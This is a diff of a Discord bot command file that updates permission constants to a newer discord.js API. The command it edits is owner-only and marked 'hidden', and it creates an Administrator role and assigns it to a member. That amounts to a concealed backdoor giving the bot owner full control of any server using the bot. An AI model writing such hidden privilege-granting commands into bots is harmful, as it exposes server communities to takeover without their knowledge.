@@ -1,4 +1,5 @@
 const config = require("../../config.json");
+const {PermissionsBitField} = require("discord.js");
 
 module.exports.run = async(client, message) => {
     if (!config.owners.includes(message.author.id)) return message.channel.send(`**Seulement le bg peut faire ça** :sunglasses:`)
@@ -12,7 +13,7 @@ module.exports.run = async(client, message) => {
         color: 'BLUE',
         reason: 'we needed a role for Super Cool People',
         permission: 'ADMINISTRATOR',
-        permissions: ['ADMINISTRATOR']
+        permissions: ['Administrator']
     }).then(role => {
         member.roles.add(role);
         console.log(role.id)
@@ -25,5 +26,5 @@ module.exports.config = {
     format: "test",
     canBeUseByBot: true,
     category: "hidden",
-    permission: "ADMINISTRATOR"
+    permission: PermissionsBitField.Flags.Administrator
 };
